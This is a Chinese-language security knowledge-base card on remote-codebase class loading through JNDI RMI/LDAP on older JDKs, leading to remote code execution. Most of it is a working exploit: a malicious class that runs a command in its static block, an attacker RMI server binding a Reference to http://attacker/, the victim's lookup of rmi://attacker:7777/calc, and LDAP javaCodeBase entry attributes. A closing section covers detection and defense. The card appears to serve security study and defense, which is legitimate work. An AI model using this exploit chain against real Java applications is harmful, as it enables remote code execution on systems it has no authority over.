---
id: web-java-deserialization-jndi-low-version-rmi-ldap-remote-codebase
title: 低版本 JNDI RMI/LDAP 远程 codebase 类加载 RCE（Reference + 静态初始化块）
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: jndi-low-version-remote-codebase-class-loading
aliases:
- JNDI 低版本利用
- JNDI 远程类加载
- RMI ReferenceWrapper
- LDAP javaCodeBase
- trustURLCodebase 默认 true
- VersionHelper12 loadClass
- getObjectFactoryFromReference
tags:
- java
- jndi
- rmi
- ldap
- reference
- codebase
- remote-class-loading
- rce
- low-version
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V191
  verified_at: '2026-11-06T22:48:45+08:00'
  notes: 已对照原文与51张图核对：RMI ReferenceWrapper+远程codebase、RegistryContext.lookup→decodeObject→NamingManager.getObjectInstance→getObjectFactoryFromReference→VersionHelper12.loadClass(Class.forName initialize=true)、静态块触发与ClassCastException副作用、RMI/LDAP两条调用栈行号(464/124/319/146/73与189/1085)与截图一致；LDAP javaNamingReference/javaFactory/javaCodeBase变体一致；高版本trustURLCodebase拦截与三类本地工厂绕过已在现有verified卡覆盖，3份重复草稿确已在rejected/drafts回收站；原文未给JDK版本区间故affected_versions为空
---

## 一句话结论

在 JDK 仍默认允许远程 codebase 的版本上，攻击者把 `Reference` 的 `factoryClassLocation` 指向自己的 HTTP 类服务器，受害者 `InitialContext.lookup` 时会通过 `NamingManager.getObjectFactoryFromReference` 远程下载并加载该类；`VersionHelper12.loadClass` 用 `Class.forName(name, true, cl)` 加载，触发恶意类的静态初始化块，在类型转换失败之前命令已经执行。

## 原理

- JNDI 的 RMI/LDAP provider 在 lookup 返回 `Reference` 后，会调用 `NamingManager.getObjectInstance`（LDAP 走 `DirectoryManager.getObjectInstance`）。
- `getObjectInstance` 发现 `ref.getFactoryClassName()` 非空，进入 `getObjectFactoryFromReference`：
  1. 先 `helper.loadClass(factoryName)` 尝试本地 classpath；
  2. 本地不存在且 `ref.getFactoryClassLocation()`（即 codebase）非空时，执行 `helper.loadClass(factoryName, codebase)`，从远程 URL 下载字节码。
- `VersionHelper12.loadClass(String, ClassLoader)` 内部是 `Class.forName(className, true, cl)`，第二个参数 `initialize=true` 表示加载后立即执行类初始化，即 `<clinit>`/静态代码块。
- 因此恶意类可以把命令执行放在静态代码块里：远程类一加载就触发，甚至不需要成功实例化；之后 `(ObjectFactory) clas.newInstance()` 的类型转换会抛 `ClassCastException`（例如 `test cannot be cast to javax.naming.spi.ObjectFactory`），但此时命令已经执行。
- 如果恶意代码写在构造方法或实例初始化块中，则触发点推迟到 `clas.newInstance()`；两条路径都在同一调用链内。
- 成立的前提是 JDK 未关闭远程 codebase：RMI 由 `com.sun.jndi.rmi.object.trustURLCodebase` 控制，LDAP 由 `com.sun.jndi.ldap.object.trustURLCodebase` 控制；低版本默认 true，高版本默认 false 并抛出 `ConfigurationException: The object factory is untrusted`。

## 触发条件

- 应用存在可控的 JNDI lookup，例如 `new InitialContext().lookup(userInput)`，或 Log4j2/Fastjson 等组件把用户输入带进 JNDI。
- 目标 JDK 允许远程 codebase（`trustURLCodebase=true`，低版本默认；或管理员显式打开）。
- 攻击者能启动 RMI Registry 或 LDAP 服务返回恶意 `Reference`，并托管可被受害者访问的 HTTP 类服务器。
- 受害者的 `factoryName` 在本地 classpath 不存在（否则优先加载本地类，不会走远程 codebase）。
- 远程类名与 Reference 中 `className`/`factoryName` 一致，编译时不要带包名或用与 Reference 匹配的全限定名。

## 利用步骤

1. 编写恶意类，把命令执行放在静态代码块（或构造方法）中，编译成 `.class`。
2. 用 HTTP 服务托管该 `.class`，确保受害者能访问。
3. 启动 RMI Registry，构造 `Reference(className, factoryName, factoryClassLocation)`，`factoryClassLocation` 指向 HTTP 根 URL；用 `ReferenceWrapper` 包裹后 `bind` 到名称。
4. 诱导/触发受害者执行 `lookup("rmi://attacker:port/name")`。
5. 受害者加载远程类，静态代码块执行命令；随后抛出的 `ClassCastException` 只是副作用，不影响已执行的命令。
6. LDAP 变体：LDAP 服务返回带 `javaClassName`、`javaFactory`、`javaCodeBase` 属性的条目，`LdapCtx.c_lookup` → `DirectoryManager.getObjectInstance` 走同一条 `getObjectFactoryFromReference` 远程加载链。

## PoC

恶意类（静态代码块触发，类名与 Reference 的 factoryName 一致）：

```java
public class test {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            System.out.println(e);
        }
    }
    public test() {}
}
```

攻击者 RMI 服务（class 文件放在 `http://attacker/` 根目录下）：

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(7777);
        Reference reference = new Reference("test", "test", "http://attacker/");
        registry.bind("calc", new ReferenceWrapper(reference));
    }
}
```

受害者触发：

```java
new InitialContext().lookup("rmi://attacker:7777/calc");
```

RMI 调用栈：

```text
loadClass:73, VersionHelper12 (com.sun.naming.internal)
loadClass:61, VersionHelper12 (com.sun.naming.internal)
getObjectFactoryFromReference:146, NamingManager (javax.naming.spi)
getObjectInstance:319, NamingManager (javax.naming.spi)
decodeObject:464, RegistryContext (com.sun.jndi.rmi.registry)
lookup:124, RegistryContext
lookup:205, GenericURLContext
lookup:417, InitialContext
```

LDAP 调用栈：

```text
loadClass:72, VersionHelper12
loadClass:61, VersionHelper12
getObjectFactoryFromReference:146, NamingManager
getObjectInstance:189, DirectoryManager
c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext
lookup:177, PartialCompositeContext
lookup:205, GenericURLContext
lookup:94, ldapURLContext
lookup:417, InitialContext
```

LDAP 条目关键属性（可用 Yakit JNDI 服务或 Marshalsec 生成）：

```text
javaClassName: <类名>
javaFactory: <类名>
javaCodeBase: http://attacker/
objectClass: javaNamingReference
```

## 变体与关联

- RMI 与 LDAP 只是 provider 不同，最终都汇聚到 `NamingManager.getObjectFactoryFromReference` 的远程 `loadClass`。
- 恶意类实现 `javax.naming.spi.ObjectFactory` 时，`newInstance` 与 `getObjectInstance` 也会被调用，可承载更复杂的逻辑；不实现时静态块先执行、随后强转失败。
- 远程类还可以是 Tomcat Filter 内存马等持久化载荷，见关联卡。
- 高版本 JDK 关闭 trustURLCodebase 后此链失效，需要改用本地工厂绕过（BeanFactory、c3p0 JavaBeanObjectFactory、Tomcat ResourceFactory 等），见关联卡。
- 关联：[[web-java-deserialization-jndi-tomcat-filter-memshell]]（远程类加载落地 Filter 内存马）。
- 关联：[[web-java-deserialization-jndi-high-version-beanfactory-el]]、[[web-java-deserialization-jndi-high-version-c3p0-javabeanobjectfactory]]、[[web-java-deserialization-jndi-tomcat-resourcefactory-jdbc-bypass]]（高版本替代路径）。

## 检测与防御

- 升级 JDK 并确认 `com.sun.jndi.rmi.object.trustURLCodebase=false`、`com.sun.jndi.ldap.object.trustURLCodebase=false`（新版本默认 false）。
- 禁止对不可信输入做 JNDI lookup；对 lookup 的协议与主机做白名单，拦截 `rmi://`、`ldap://`、`ldaps://` 外部地址。
- 网络层限制应用服务器访问外部 RMI/LDAP/HTTP 类托管地址，阻断远程 codebase 下载。
- 检测 JNDI 返回的 Reference 中出现非空 `factoryClassLocation`/`javaCodeBase`；监控 `NamingManager.getObjectFactoryFromReference` 远程 `loadClass` 与 `Class.forName(..., true, ...)` 异常栈。
- 日志/流量中出现 `javaNamingReference`、`javaFactory`、`javaCodeBase` 或 `ReferenceWrapper` 相关特征时告警。
